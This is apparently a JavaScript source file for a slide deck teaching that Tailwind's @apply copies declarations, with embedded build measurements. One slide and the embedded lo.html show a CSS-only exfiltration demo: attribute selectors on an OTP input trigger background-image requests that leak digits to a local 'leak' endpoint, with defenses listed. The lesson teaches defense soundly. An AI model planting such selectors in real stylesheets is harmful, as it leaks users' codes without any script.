/*DU_LIEU*/
const DU_LIEU = {
 "t4-2:file:in.css": "@tailwind components;\n@tailwind utilities;\n@layer components {\n  .btn    { @apply px-4 py-2 rounded bg-blue-500 text-white; }\n  .btn-lg { @apply btn px-8; }\n}\n",
 "t4-2:file:nut.html": "<button class=\"btn\">Lưu</button> <button class=\"btn-lg\">Lưu</button>\n",
 "t4-2:v3": "$ npx tailwindcss --content './nut.html' -i in.css -o out.css 2>&1 | tail -1\nDone in 239ms.\n$ cat out.css\n.btn {\n  border-radius: 0.25rem;\n  --tw-bg-opacity: 1;\n  background-color: rgb(59 130 246 / var(--tw-bg-opacity, 1));\n  padding-left: 1rem;\n  padding-right: 1rem;\n  padding-top: 0.5rem;\n  padding-bottom: 0.5rem;\n  --tw-text-opacity: 1;\n  color: rgb(255 255 255 / var(--tw-text-opacity, 1))\n}\n\n.btn-lg {\n  border-radius: 0.25rem;\n  --tw-bg-opacity: 1;\n  background-color: rgb(59 130 246 / var(--tw-bg-opacity, 1));\n  padding-top: 0.5rem;\n  padding-bottom: 0.5rem;\n  --tw-text-opacity: 1;\n  color: rgb(255 255 255 / var(--tw-text-opacity, 1));\n  padding-left: 2rem;\n  padding-right: 2rem\n}",
 "t4-2:file:src/in.css": "@import \"tailwindcss\";\n@source \"./nut.html\";\n@layer components {\n  .btn    { @apply px-4 py-2 rounded bg-blue-500 text-white; }\n  .btn-lg { @apply btn px-8; }\n}\n",
 "t4-2:file:src/nut.html": "<button class=\"btn\">Lưu</button> <button class=\"btn-lg\">Lưu</button>\n",
 "t4-2:file:src/in2.css": "@import \"tailwindcss\";\n@source \"./nut.html\";\n@utility btn    { @apply px-4 py-2 rounded bg-blue-500 text-white; }\n@utility btn-lg { @apply btn px-8; }\n",
 "t4-2:v4": "$ npx @tailwindcss/cli -i src/in.css -o ../c42o/v4.css 2>&1 | grep -oE 'Error: Cannot apply[^`]*`[^`]*`'\nError: Cannot apply unknown utility class `btn`\n$ npx @tailwindcss/cli -i src/in2.css -o ../c42o/v4b.css 2>&1 | tail -1\nDone in 40ms\n$ grep -A7 '^  \\.btn-lg {' ../c42o/v4b.css\n  .btn-lg {\n    border-radius: 0.25rem;\n    background-color: var(--color-blue-500);\n    padding-inline: calc(var(--spacing) * 4);\n    padding-block: calc(var(--spacing) * 2);\n    color: var(--color-white);\n    padding-inline: calc(var(--spacing) * 8);\n  }",
 "t4-2:file:phinh.cjs": "// phinh.cjs — N \"component class\" cung chung mot nen (@apply) vs N the dung thang tien ich: CSS lon theo N hay dung yen?\nconst { execSync } = require('node:child_process'); const fs = require('node:fs');\nconst NEN = 'px-4 py-2 rounded-lg bg-blue-600 text-white font-medium shadow';\nfor (const n of [1, 5, 10, 20]) {\n  let css = '@tailwind components;\\n@tailwind utilities;\\n@layer components {\\n', htmlA = '', htmlU = '';\n  for (let i = 0; i < n; i++) { css += `  .nut-${i} { @apply ${NEN} mt-${i % 12}; }\\n`; htmlA += `<b class=\"nut-${i}\"></b>`; htmlU += `<b class=\"${NEN} mt-${i % 12}\"></b>`; }\n  fs.writeFileSync('pa.css', css + '}\\n'); fs.writeFileSync('pa.html', htmlA); fs.writeFileSync('pu.html', htmlU); fs.writeFileSync('pu.css', '@tailwind utilities;\\n');\n  execSync('npx tailwindcss --content ./pa.html -i pa.css -o oa.css --minify 2>/dev/null; npx tailwindcss --content ./pu.html -i pu.css -o ou.css --minify 2>/dev/null');\n  console.log(`N=${String(n).padStart(2)}  @apply: ${String(fs.statSync('oa.css').size).padStart(5)} B   tien ich: ${String(fs.statSync('ou.css').size).padStart(5)} B`);\n}\n",
 "t4-2:phinh": "$ node phinh.cjs\nN= 1  @apply:   477 B   tien ich:   603 B\nN= 5  @apply:  1516 B   tien ich:   696 B\nN=10  @apply:  2598 B   tien ich:   817 B\nN=20  @apply:  5218 B   tien ich:   868 B",
 "t4-2:kho": "$ git grep -c '@apply' -- '*.css' '*.scss' | wc -l\n       0\n$ git ls-files '*.css' | xargs wc -l | tail -1\n   24610 total\n$ wc -l src/app/globals.css\n    6508 src/app/globals.css\n$ grep -c 'rich-content' src/app/globals.css\n241",
 "t4-2:file:in3.css": "@tailwind base;\n@tailwind components;\n@tailwind utilities;\n@layer components {\n  .btn    { @apply px-4 py-2 rounded bg-blue-500 text-white; }\n  .btn-lg { @apply btn px-8; }\n}\n.nut-ngoai { padding-left: 1rem; padding-right: 1rem; }\n",
 "t4-2:file:merge.html": "<!doctype html><html><head><meta charset=\"utf-8\"><link rel=\"stylesheet\" href=\"o3.css\"></head>\n<body class=\"bg-white p-4 text-base space-y-3\">\n  <div><button id=\"a\" class=\"btn px-8\">btn + px-8</button> <i class=\"text-slate-500\">cn('btn', 'px-8')</i></div>\n  <div><button id=\"b\" class=\"btn-lg px-4\">btn-lg + px-4</button> <i class=\"text-slate-500\">cn('btn-lg', 'px-4')</i></div>\n  <div><button id=\"c\" class=\"nut-ngoai px-8 bg-blue-500 text-white rounded py-2\">nut-ngoai + px-8</button> <i class=\"text-slate-500\">ngoài @layer</i></div>\n</body></html>\n",
 "t4-2:file:tm.cjs": "// tm.cjs — twMerge (2.6.1 CUA KHO) co biet lop @apply khong?\nconst { twMerge } = require('/Users/admin/.rtq-twc/lab/kho/node_modules/tailwind-merge');\nfor (const s of ['btn px-8', 'btn-lg px-4', 'btn btn-lg']) console.log(JSON.stringify(s).padEnd(16), '->', JSON.stringify(twMerge(s)));\n",
 "t4-2:chrome": "$ npx tailwindcss --content './merge.html' -i in3.css -o o3.css 2>&1 | tail -1\nDone in 141ms.\n$ grep -nE '^\\.(btn|btn-lg|px-8|px-4|nut-ngoai) \\{' o3.css\n557:.btn {\n569:.btn-lg {\n605:.px-4 {\n610:.px-8 {\n635:.nut-ngoai {\n$ node tm.cjs\n\"btn px-8\"       -> \"btn px-8\"\n\"btn-lg px-4\"    -> \"btn-lg px-4\"\n\"btn btn-lg\"     -> \"btn btn-lg\"",
 "t4-2:file:lo.html": "<!doctype html><html><head><meta charset=\"utf-8\">\n<style>\n  /* \"chi la CSS\" tu mot goi/CDN bi chiem quyen — khong mot dong JavaScript */\n  input[name=\"otp\"][value^=\"4\"] { background-image: url(\"http://127.0.0.1:20121/leak?otp=4\"); }\n  input[name=\"otp\"][value^=\"7\"] { background-image: url(\"http://127.0.0.1:20121/leak?otp=7\"); }\n</style></head>\n<body style=\"font:16px sans-serif;padding:16px\">\n  <label>Mã OTP <input name=\"otp\" value=\"4821\" style=\"border:1px solid #94a3b8;padding:6px\"></label>\n</body></html>\n",
 "t4-2:xau": "",
 "anh-twc-4-2:merge": {
  "url": "http://127.0.0.1:20121/c42/merge.html",
  "vp": [
   560,
   200
  ],
  "rect": {
   "#a": [
    16,
    16,
    140,
    40
   ],
   "#b": [
    16,
    68,
    129,
    40
   ],
   "#c": [
    16,
    120,
    154,
    40
   ]
  },
  "console": [],
  "ketQua": {
   "s": "{\"a\":\"32px\",\"b\":\"16px\",\"c\":\"16px\"}"
  }
 },
 "anh-twc-4-2:xau": {
  "url": "http://127.0.0.1:20121/c42/lo.html",
  "vp": [
   560,
   120
  ],
  "rect": {},
  "mang": [
   {
    "url": "http://127.0.0.1:20121/c42/lo.html",
    "ma": 200,
    "loai": "document",
    "kt": 513
   },
   {
    "url": "http://127.0.0.1:20121/leak?otp=4",
    "ma": 404,
    "loai": "image",
    "kt": 469
   }
  ],
  "console": [
   {
    "kieu": "error",
    "chu": "Failed to load resource: the server responded with a status of 404 (File not found)"
   }
  ]
 }
};
/*HET_DU_LIEU*/
import { lamDeck, css, tsx, html, tn, br, box, two, steps, kw, c, cmp, meter } from './_twc-chung.mjs';

export const deck = { key: 'twc-04-2', code: 'TWC 4.2', title: 'Why @apply undoes its own point', sub: 'Chapter 4 · Lesson 4.2' };
const O = (k) => { const v = DU_LIEU[`t4-2:${k}`]; if (v === undefined) throw new Error('thiếu ' + k); return v; };
const A = (k) => { const v = DU_LIEU[`anh-twc-4-2:${k}`]; if (!v) throw new Error('thiếu ảnh ' + k); return v; };
const D = (...a) => `<div>${a.join('')}</div>`;
const doan = (k, dau) => { const ls = O(k).split('\n'); const i = ls.findIndex((l) => l.startsWith('$ ') && l.includes(dau)); if (i < 0) throw new Error('không thấy ' + dau + ' trong ' + k); const r = []; for (let j = i + 1; j < ls.length && !ls[j].startsWith('$ '); j++) r.push(ls[j]); return r; };
const B = (ten, o) => br('twc-04-2', ten, { vp: 560, ...o });
const bo = (x) => x.replace(/\s+/g, '');

// ── số đo (chạy thật t4-2 · Tailwind 3.4.19 + 4.3.5 · tailwind-merge 2.6.1 CỦA KHO · Chromium · frontend/ 14/11/2026)
const V3 = doan('v3', 'cat out.css');
const BTN = V3.slice(0, V3.indexOf('}') + 1), LG = V3.slice(V3.indexOf('.btn-lg {'), V3.lastIndexOf('}') + 1);
const decl = (b) => b.filter((l) => l.includes(':')).map((l) => l.trim().replace(/;$/, ''));
const DB = decl(BTN), DL = decl(LG), CHEP = DL.filter((l) => DB.includes(l));
const V4E = doan('v4', 'grep -oE')[0], V4B = doan('v4', 'grep -A7');
const PH = doan('phinh', 'node phinh.cjs').map((l) => { const m = l.match(/^N=\s*(\d+)\s+@apply:\s+(\d+) B\s+tien ich:\s+(\d+) B$/); return [+m[1], +m[2], +m[3]]; });
const KAP = doan('kho', "git grep -c '@apply'")[0].trim(), KCSS = doan('kho', 'xargs wc -l')[0].trim().split(/\s+/)[0], KG = doan('kho', 'wc -l src/app')[0].trim().split(/\s+/)[0], KRC = doan('kho', 'rich-content')[0].trim();
const ORD = doan('chrome', 'grep -nE'), TM = doan('chrome', 'node tm.cjs').map((l) => l.match(/^"([^"]+)"\s+->\s+"([^"]+)"$/).slice(1));
const MG = JSON.parse(A('merge').ketQua.s), XM = A('xau').mang;
const LEAK = XM.find((m) => m.url.includes('/leak'));
if (DB.length !== 9 || DL.length !== 9 || CHEP.length !== 7) throw new Error('số khai báo @apply đổi');
if (!V4E.includes('`btn`') || V4B.filter((l) => l.includes('padding-inline')).length !== 2) throw new Error('v4 đổi');
if (PH.length !== 4 || !(PH[3][1] > 5 * PH[3][2])) throw new Error('phình đổi');
if (KAP !== '0' || KCSS !== '24610' || KG !== '6508') throw new Error('kho đổi');
if (MG.a !== '32px' || MG.b !== '16px' || MG.c !== '16px' || TM[0][1] !== 'btn px-8') throw new Error('merge đổi');
if (!LEAK || !LEAK.url.endsWith('otp=4') || LEAK.loai !== 'image') throw new Error('rò OTP đổi');
const SRC = `@tailwind components;
@tailwind utilities;
@layer components {
  .btn {
    @apply px-4 py-2 rounded
           bg-blue-500 text-white; }
  .btn-lg { @apply btn px-8; }
}`;
if (bo(SRC) !== bo(O('file:in.css'))) throw new Error('mã hiển thị KHÔNG khớp in.css');
const LO = O('file:lo.html');
const LOH = `<style>
  input[name="otp"][value^="4"] {
    background-image: url("http://127.0.0.1:20121/leak?otp=4"); }
  input[name="otp"][value^="7"] {
    background-image: url("http://127.0.0.1:20121/leak?otp=7"); }
</style>
<input name="otp" value="4821">`;
for (const dong of LOH.split('\n').slice(0, -1)) if (!bo(LO).includes(bo(dong))) throw new Error('mã hiển thị KHÔNG khớp lo.html: ' + dong);
const ord = (s) => ORD.find((l) => l.includes(`.${s} {`)).split(':')[0];

export const S = [
  { cover: true, nhan: 'Chapter 4 · Lesson 4.2', t: 'Why @apply undoes the thing<br>that made it worth it', sub: 'Everyone meeting a long class list reaches for @apply. Measured in Tailwind 3 and 4: it copies, it grows like hand-written CSS, Tailwind 4 refuses half of it — and this site uses it zero times',
    en: 'Lesson four point two. Everyone meeting a long class list reaches for the same idea: pull the utilities into a named CSS class with at-apply. This lesson measures what at-apply really does, in Tailwind three and four, and why this site uses it exactly zero times.' },
  { t: 'What you will take away from this lesson', to: true, giua: true, body: `<ul>
    <li><code>@apply</code> <b>copies</b> declarations — <code>.btn-lg</code> carries ${CHEP.length} of <code>.btn</code>'s ${DB.length}</li>
    <li>So the stylesheet grows with every component class, like hand-written CSS</li>
    <li>Tailwind 4: <code>@apply btn</code> is an <b>error</b> — you need <code>@utility</code></li>
    <li>What happens to the caller's classes — measured, with one correction</li>
    <li>Where <code>@apply</code> is still the honest choice</li></ul>`,
    en: `Five takeaways: at-apply copies declarations, ${CHEP.length} of nine; the stylesheet grows with every component class; Tailwind four refuses at-apply of a custom class; what happens to the caller's classes, measured with one correction; and where at-apply is still honest.` },
  { t: 'The measurement — Tailwind 3.4.19', body: two(D(css(SRC, { sm: true }), box('The idea', 'Name the button once, reuse the name. <code>.btn-lg</code> "extends" <code>.btn</code>. It looks like inheritance.', 'lam')),
    D(tn(['$ npx tailwindcss … && cat out.css', ...LG.map((l) => (DB.includes(l.trim().replace(/;$/, '')) ? l + '   ← copy' : l))].join('\n'), { fs: 14, wrap: 64, title: 'Tailwind 3.4.19 (real)' }),
      box('Read it', `<code>.btn-lg</code> does not <b>reference</b> <code>.btn</code>. It contains a full copy: <b>${CHEP.length} of its ${DL.length}</b> declarations are duplicated bytes. <code>@apply</code> is a macro that pastes declarations at build time.`, 'do2')), 'r46'),
    en: `The measurement in Tailwind three. Dot btn-lg does not reference dot btn. It contains a full copy: ${CHEP.length} of its ${DL.length} declarations are duplicated, only the horizontal padding is new. At-apply is a macro that pastes declarations at build time, not a way to share them.` },
  { t: 'Tailwind 4: @apply of a custom class is an ERROR', body: two(D(tn(['$ npx @tailwindcss/cli -i src/in.css …   # same CSS as slide 3', V4E].join('\n'), { fs: 15, wrap: 56, title: 'Tailwind 4.3.5 (real)' }),
      box('Why', 'In Tailwind 4, <code>@apply</code> only accepts <b>utilities</b> it knows. A class in <code>@layer components</code> is just CSS to it, so <code>btn</code> is "unknown". To make it applicable you must register it with <code>@utility</code>.', 'lam')),
    D(tn(['@utility btn    { @apply px-4 py-2 rounded bg-blue-500 text-white; }', '@utility btn-lg { @apply btn px-8; }', '$ grep -A7 \'^  \\.btn-lg {\' v4b.css', ...V4B].join('\n'), { fs: 14, wrap: 64, title: 'Tailwind 4.3.5 (real)' }),
      box('Still a copy — now with a dead line', '<code>.btn-lg</code> carries all of <code>.btn</code>, including <code>padding-inline</code> <b>twice</b>: the ×4 copy, then the ×8 that overrides it. The upgrade made the cost visible.', 'do2')), 'r46'),
    en: 'Tailwind four refuses the same file: cannot apply unknown utility class btn. In version four, at-apply only accepts utilities, so a component class must be registered with at-utility. Then it builds, and btn-lg still carries a full copy, with padding-inline written twice.' },
  { t: 'It grows like hand-written CSS — measured', body: two(D(tn(['$ node phinh.cjs   # N classes sharing one base, Tailwind 3.4.19, minified', ...doan('phinh', 'node phinh.cjs')].join('\n'), { fs: 15, wrap: 60, title: 'real' }),
      meter([[`N=${PH[3][0]} · @apply`, PH[3][1], '#dc2626'], [`N=${PH[3][0]} · utilities`, PH[3][2], '#0891b2']], { don: 'B', nhan: 200, fs: 18, rh: 50, w: 560 })),
    D(box('Read it', `Twenty component classes, each <code>@apply</code>-ing the same base: <b>${PH[3][1]} B</b>. The same twenty elements written with utilities: <b>${PH[3][2]} B</b>. With <code>@apply</code> every new class adds ~260 bytes; with utilities only a <b>new</b> utility adds anything.`, 'do2'),
      box('This destroys the argument from lesson 0.1', 'The economic case for utility CSS was: stylesheet size tracks your <b>vocabulary</b>, not your number of use sites. <code>@apply</code> reverses that exactly.', 'lam')), 'r64'),
    en: `It grows like hand-written CSS. Twenty component classes sharing one base through at-apply: ${PH[3][1]} bytes. The same twenty elements written with utilities: ${PH[3][2]} bytes. Every at-apply class adds about two hundred sixty bytes. That reverses the argument from lesson zero point one.` },
  { t: 'What you give up, item by item', body: cmp(['you lose', 'why'], [['deduplication', 'measured on slides 3–5: every class carries its own copy'], ['readability at the call site', '<code>class="btn"</code> says nothing about the look — open a stylesheet to find out'], ['the merge model', '<code>twMerge</code> does not know <code>btn</code>: <code>cn(\'btn btn-lg\')</code> keeps both, the stylesheet decides'], ['safe deletion', 'deleting a line from <code>.btn</code> may break every element using it'], ['variants without naming', '<code>.btn:hover</code>, <code>.btn-lg:hover</code>… the naming problem returns for every state']], { hl: [0, 2] }),
    en: 'What you give up, item by item: deduplication; readability at the call site, because class btn says nothing about the look; the merge model, because twMerge does not know btn; safe deletion; and variants without naming, because every state needs a new name again.' },
  { t: 'The merge claim, measured — and corrected', body: two(D(B('merge', { url: 'c42/merge.html · Tailwind 3.4.19', h: 170, w: 440 }),
      tn(['$ node tm.cjs   # twMerge 2.6.1 of this site', ...TM.map(([a, b]) => `${JSON.stringify(a).padEnd(14)} -> ${JSON.stringify(b)}`), '$ grep -nE … o3.css   # order in the stylesheet', ...ORD].join('\n'), { fs: 14, wrap: 54, title: 'real' })),
    D(cmp(['element', 'padding-left', 'who won'], [['<code>btn px-8</code>', `<b>${MG.a}</b>`, 'caller — <code>.px-8</code> line ' + ord('px-8') + ' after <code>.btn</code> ' + ord('btn')], ['<code>btn-lg px-4</code>', `<b>${MG.b}</b>`, 'caller — utilities come after components'], ['<code>nut-ngoai px-8</code>', `<b>${MG.c}</b>`, '<b>the class</b> — written outside <code>@layer</code>, line ' + ord('nut-ngoai')]], { hl: [2] }),
      box('Correction', 'The old lesson said <code>cn(\'btn\', \'px-8\')</code> "cannot resolve the padding". <code>twMerge</code> indeed keeps both — but inside <code>@layer components</code> the <b>stylesheet order</b> still lets the caller win. It breaks for classes <b>outside a layer</b>, and between two custom classes.', 'lam')), 'r46'),
    en: `The merge claim, measured and corrected. TwMerge keeps btn and px-8 both, as the old lesson said. But Chromium shows the caller still wins, ${MG.a}, because components come before utilities in the stylesheet. It breaks for a class written outside a layer: there the class beats the caller's px-8.` },
  { t: 'What this codebase did instead', body: two(D(tn([`$ git grep -c '@apply' -- '*.css' '*.scss' | wc -l`, KAP, `$ git ls-files '*.css' | xargs wc -l | tail -1`, `   ${KCSS} total`, '$ wc -l src/app/globals.css', `    ${KG} src/app/globals.css`, "$ grep -c 'rich-content' src/app/globals.css", KRC].join('\n'), { fs: 16, wrap: 56, title: 'frontend/ · 14/11/2026 (real)' })),
    D(box('Zero, across every stylesheet', `<b>0</b> uses of <code>@apply</code> in <b>${Number(KCSS).toLocaleString('en')}</b> lines of CSS. (The old lesson said 4,462 lines for <code>globals.css</code>; it is <b>${Number(KG).toLocaleString('en')}</b> now.)`, 'xanh'),
      box('The implicit rule', `When CSS is genuinely needed — styling HTML the site does not render itself, like <code>.rich-content</code> (${KRC} lines mention it) — write <b>plain CSS</b>. When component styling is needed, write a <b>component</b>.`, 'ok')), 'r46'),
    en: `What this codebase did instead. Zero uses of at-apply in ${KCSS} lines of CSS; globals dot css alone is now ${KG} lines. When CSS is genuinely needed, like rich-content for HTML the site does not render itself, it is written as plain CSS. Component styling is a component.` },
  { t: 'The comparison, made concrete', body: D(two(tsx(`{/* @apply version: indirection, copies, no merge */}
<button className="btn btn-lg">Save</button>

{/* component version: same brevity, none of the costs */}
<Button size="lg">Save</Button>`),
      box('Both call sites are short', 'The difference is <b>everything behind them</b> — what ends up in the stylesheet, who wins an override, and where you go to read the look.', 'lam'), 'r64'),
    cmp(['', '<code>.btn.btn-lg</code> built with @apply', '<code>&lt;Button size="lg"&gt;</code> component'], [['stylesheet', 'one copy of the base per class (slide 5)', 'utilities, generated once each'], ['caller override', 'depends on layer order (slide 7)', '<code>cn(…, className)</code> — caller last (3.4)'], ['variants', 'a naming convention: <code>.btn-lg</code>, <code>.btn-cta</code>…', 'a typed prop: <code>size="lg"</code>'], ['where to read the look', 'a stylesheet, somewhere', 'the component file, already in your tree']], { hl: [1] })),
    en: 'The comparison made concrete. Both call sites are short. Behind them: the at-apply version keeps a copy per class, depends on layer order for overrides, and turns variants into a naming convention. The component keeps utilities deduplicated, puts the caller last in cn, and makes variants a typed prop.' },
  { t: 'Where @apply is the HONEST choice', body: two(D(box('No component layer at all', 'A plain HTML site, a Rails/Django/Blade template, a WordPress theme, a web component. Nothing to extract into — <code>@apply</code> is a real option and the duplication is a cost you accept <b>knowingly</b>.', 'xanh'),
      box('HTML you do not render', 'Markdown output, a rich-text editor, a CMS body. You own the CSS but not the elements. Even there, this site chose plain CSS for <code>.rich-content</code>.', 'ok')),
    D(box('Tailwind 4 detail', 'In a CSS Module or a Vue/Svelte <code>&lt;style&gt;</code> block, <code>@apply</code> needs <code>@reference "../app.css";</code> first — the file is compiled alone and does not know your theme.', 'lam'),
      box('In a React codebase with 1,678 component files', 'That argument does not apply. The answer to a long class list is a component.', 'do2')), 'r46'),
    en: 'Where at-apply is the honest choice: no component layer at all, like a plain HTML site, a server template or a web component; and HTML you do not render, like markdown. In Tailwind four, a CSS module needs at-reference first. In a React codebase, the answer is a component.' },
  { t: 'Trap: @apply-ing a class that is itself @apply', body: two(D(css(`@layer components {
  .btn      { @apply px-4 py-2 rounded bg-blue-500 text-white; }
  .btn-lg   { @apply btn px-8; }        /* copy of .btn  */
  .btn-cta  { @apply btn-lg shadow-lg; } /* copy of a copy */
}`), box('Count it', 'Slide 3 measured one level: <code>.btn-lg</code> = 9 declarations, 7 of them pasted from <code>.btn</code>. A third level pastes those 9 again, plus its own. Nothing in the source shows the copies; only the built CSS does.', 'lam')),
    D(box('Reads like inheritance, behaves like copy-paste', 'Each level pastes the level below. A three-deep chain triples the declarations, and a change at the root silently rewrites every descendant\'s output.', 'do2'),
      box('And Tailwind 4 makes it explicit', 'The chain only builds after every link is turned into an <code>@utility</code> — measured on slide 4, with the overridden <code>padding-inline</code> still in the output.', 'lam')), 'r46'),
    en: 'The trap: at-apply of a class that is itself built with at-apply. It reads like inheritance and behaves like copy-paste. Each level pastes the one below, so a three-deep chain triples the declarations, and a change at the root silently rewrites every descendant.' },
  { t: 'In real life — and the attacker\'s view', body: two(D(box('Every day', 'Citing a source with a footnote vs <b>pasting the whole paragraph</b> into every essay. <code>@apply</code> pastes. Change the source and every essay must be rebuilt — and they all got longer.', 'lam'),
      html(LOH, { sm: true }),
      tn([`GET ${LEAK.url.replace('http://', '')}  → ${LEAK.ma} · type ${LEAK.loai}   # Chromium network log (real)`].join('\n'), { fs: 14, wrap: 64, title: 'c42/lo.html · real' })),
    D(box('The attacker\'s view: CSS is code', 'Your stylesheet is a program the browser runs. A hijacked CSS package or CDN file needs <b>no JavaScript</b> to leak data: an attribute selector plus a background URL sent the first digit of the OTP to another server, measured. Repeat per digit and the code leaks.', 'do2'),
      box('Defend', 'Never put secrets in HTML attributes; pin and review CSS dependencies like JS ones; add Subresource Integrity to CDN stylesheets; a CSP <code>img-src</code>/<code>style-src</code> allow-list blocks the request. Related: Web Foundations, Node.js 4.3.', 'ok')), 'r46'),
    en: 'In real life: at-apply is pasting the whole paragraph instead of citing it. The attacker view: CSS is code. Without one line of JavaScript, an attribute selector plus a background URL sent the first digit of an OTP to another server, measured. Defend with integrity hashes, a content security policy, and no secrets in attributes.' },
  { t: 'Key terms of this lesson', body: `<div style="display:flex;flex-wrap:wrap;gap:12px">${[
      kw('@apply', 'build-time macro: pastes declarations'), kw('copy, not reference', `.btn-lg carries ${CHEP.length} of 9`), kw('vocabulary vs use sites', 'utilities grow with vocabulary; @apply with classes'),
      kw('@utility (v4)', 'register a class so @apply can use it'), kw('@reference (v4)', 'needed in CSS Modules / style blocks'), kw('layer order', 'components before utilities ⇒ caller wins'),
      kw('outside @layer', 'a custom class beats the utility'), kw('CSS exfiltration', 'selector + url() leaks attribute values'),
    ].join('')}</div>`, to: true,
    en: 'Key terms: at-apply; copy, not reference; vocabulary versus use sites; at-utility and at-reference in Tailwind four; layer order; a class outside a layer; and CSS exfiltration.' },
  { t: 'Your turn — and what to keep', body: two(steps([
      `Build ${c('.btn')} + ${c('.btn-lg { @apply btn px-8 }')} in Tailwind 3 — count the copied lines`,
      'Build the same file in Tailwind 4 — read the error, fix it with @utility',
      `Put ${c('class="btn px-8"')} and a class outside @layer in Chromium — who wins?`,
      `Run ${c("git grep -c '@apply'")} on your own project`,
    ]), box('Keep these', '<ul><li><code>@apply</code> copies, it does not share</li><li>CSS grows with every component class</li><li>Tailwind 4: only utilities can be applied</li><li>In React, the name is a component</li></ul>', 'lam'), ''),
    en: 'Your turn: build the button in Tailwind three and count the copies; build it in Tailwind four and read the error; test who wins in Chromium; and grep your own project. Keep: at-apply copies; the stylesheet grows per class; Tailwind four applies only utilities; in React, the name is a component.' },
];
export const slides = lamDeck({ chuong: 'Chapter 4 — Components, and the right place to reuse', bai: '4.2' }, S);
